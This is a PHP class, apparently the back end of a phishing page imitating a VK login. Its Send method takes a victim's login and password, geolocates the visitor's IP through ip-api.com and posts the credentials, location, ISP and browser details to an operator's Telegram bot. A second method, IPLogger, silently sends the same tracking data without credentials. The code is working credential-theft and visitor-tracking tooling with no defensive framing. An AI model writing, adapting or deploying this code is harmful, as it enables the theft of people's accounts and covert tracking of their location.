<?php

class CheckUser{
    private string $token;
    private string $chat_id;

    public function __construct($token, $chat_id){
        $this->token = $token;
        $this->chat_id = $chat_id;
    }

    private function post(string $url, array $params = null) {
        $ch = curl_init($url);
        // curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
        if(isset($params['params'])) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params['params']));
        }
        if(isset($params['headers'])) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $params['headers']);
        }
        $result = curl_exec($ch);
        curl_close($ch);
    
        return $result;
    }

    public function Send($login, $password){
        // Getting ip address
        if (!empty($_SERVER['HTTP_CLIENT_IP'])){
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }else{
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        }
        
        // Getting browser info
        $browser = $_SERVER['HTTP_USER_AGENT'];
        // URL for getting more info about api 
        $url = 'http://ip-api.com/json/'.$ipaddress;
        // Making post requests to ip-api.com
        $result = $this->post($url);
        // Result to php array
        $ip_info = json_decode($result);
        // From array to variables
        $country = $ip_info -> country;
        $region = $ip_info -> regionName;
        $city = $ip_info -> city;
        $localtime = $ip_info -> timezone;
        $latitude = $ip_info -> lat;
        $longitude = $ip_info -> lon;
        $provider = $ip_info -> isp;

        // Array for sending beautiful text into telegram
        
        $arr = array(
            'VK DATA',
            'IP Address: ' => $ipaddress,
            '🏳Country: ' => $country,
            '🏛Region: ' => $region,
            '🏢City: ' => $city,
            '🕐Local Time: ' => $localtime,
            '📡Latitude and Logitude: ' => $latitude.' '.$longitude,
            '🗿Internet Provider: ' => $provider,
            '💻Browser and User-Agent: ' => $browser,
            '👤Login: ' => $login,
            '🔑Password: ' => $password,
         );



        // Changing line break item with %0A to send using url in get request
        foreach($arr as $key => $value) {
            $txt .= "<b>".$key."</b> ".$value."%0A";
        };
        // Sending message
        $sendToTelegram = fopen("https://api.telegram.org/bot{$this->token}/sendMessage?chat_id={$this->chat_id}&parse_mode=html&text={$txt}", 'r');
        
        if($sendToTelegram){
            return true;
        } else {
            return false;
        }
    }


    public function IPLogger() {
        ini_set('user_agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36');

        if (!empty($_SERVER['HTTP_CLIENT_IP']))
            {
                $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
            }
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
            {
                $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
            }
        else
            {
                $ipaddress = $_SERVER['REMOTE_ADDR'];
            }

        $browser = $_SERVER['HTTP_USER_AGENT'];

        // URL страницы, которую открываем
        $url = 'http://ip-api.com/json/'.$ipaddress;

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        curl_close($ch);

        $ipinfo = json_decode($response);

        $country = $ipinfo -> country;
        $region = $ipinfo -> regionName;
        $city = $ipinfo -> city;
        $localtime = $ipinfo -> timezone;
        $latitude = $ipinfo -> lat;
        $longitude = $ipinfo -> lon;
        $provider = $ipinfo -> isp;


        //Собираем в массив то, что будет передаваться боту
        $arr = array(
            'VK DATA',
            'IP Address: ' => $ipaddress,
            '🏳Country: ' => $country,
            '🏛Region: ' => $region,
            '🏢City: ' => $city,
            '🕐Local Time: ' => $localtime,
            '📡Latitude and Logitude: ' => $latitude.' '.$longitude,
            '🗿Internet Provider: ' => $provider,
            '💻Browser and User-Agent: ' => $browser,
        );

        //Настраиваем внешний вид сообщения в телеграме
        foreach($arr as $key => $value) {
            $txt .= "<b>".$key."</b> ".$value."%0A";
        };

        //Передаем данные боту
        $sendToTelegram = fopen("https://api.telegram.org/bot{$this->token}/sendMessage?chat_id={$this->chat_id}&parse_mode=html&text={$txt}","r");
    }

}